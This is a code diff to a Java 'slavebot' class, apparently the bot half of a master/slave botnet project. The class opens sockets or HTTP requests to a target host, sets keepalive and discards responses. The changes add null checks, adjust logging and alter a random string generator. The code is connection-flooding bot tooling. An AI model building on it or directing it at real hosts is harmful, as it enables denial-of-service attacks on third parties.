@@ -102,6 +102,7 @@ public class slavebot extends Thread {
 					terminate(ind);
 					ind = getElementIndex(targetIden, type, tport);
 				}
+				System.out.println("Diconnection finished.");
 			}
 
 		}
@@ -111,7 +112,7 @@ public class slavebot extends Thread {
 
 	public void run() {
 		try {
-			if (option.substring(0, 4).equals("url=")) {
+			if (option != null && option.substring(0, 4).equals("url=")) {
 				String myurlstring = "";
 				if (targetport == 80)
 					myurlstring = "http://" + targetname + option.substring(4);
@@ -133,10 +134,12 @@ public class slavebot extends Thread {
 				while ((inputLine = in.readLine()) != null)
 					; // just discard all stuffs returned
 						// System.out.println(inputLine);
-				System.out.println("Discard all stuffs from the server.");
+				System.out.println("Discard all stuff (html file) from the server.");
 
 				in.close();
 
+				System.out.println("Disconnect with " + myurlstring + " automatically.");
+				
 				return;
 			}
 
@@ -144,7 +147,8 @@ public class slavebot extends Thread {
 			// Socket() can handle IP and name
 			Socket targetsock = new Socket(targetname, targetport);
 
-			if (option.equals("keepalive")) {
+			// set keepalive
+			if (option != null && option.equals("keepalive")) {
 				targetsock.setKeepAlive(true);
 				System.out.println("keepalive setted");
 			}
@@ -207,8 +211,9 @@ public class slavebot extends Thread {
 			try {
 				System.out.println("Try to close the connection with " + targets.get(index).getName());
 				targets.get(index).getSock().close();
-				System.out.println("Close succeed!");
 				targets.remove(index);
+				System.out.println("Close succeed!");
+
 			} catch (Exception e) {
 				System.out.println("Failed close connection with " + targets.get(index).getName());
 			}
@@ -217,8 +222,8 @@ public class slavebot extends Thread {
 
 	public static String generateString() {
 		Random r = new Random();
-		String source = "0123456789abcdefghijklmnopqrstuvwxyz";
-		int len = r.nextInt(10);
+		String source = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+		int len = r.nextInt(10) + 1;
 		char[] text = new char[len];
 		for (int i = 0; i < len; i++) {
 			text[i] = source.charAt(r.nextInt(source.length()));
